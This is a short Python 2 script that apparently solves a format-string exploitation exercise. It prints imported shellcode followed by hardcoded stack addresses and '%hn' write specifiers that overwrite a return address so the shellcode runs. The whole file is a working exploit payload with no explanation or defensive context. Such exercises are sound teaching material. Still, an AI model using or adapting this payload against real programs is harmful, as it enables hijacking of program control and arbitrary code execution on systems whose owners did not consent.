from struct import pack
from shellcode import shellcode


code_addr = 0xbffe9180;
return_addr = 0xbffe998c;

print shellcode + "A\x8c\x99\xfe\xbf"+ "\x8e\x99\xfe\xbf%37216x%10$hn%11902x%11$hn"
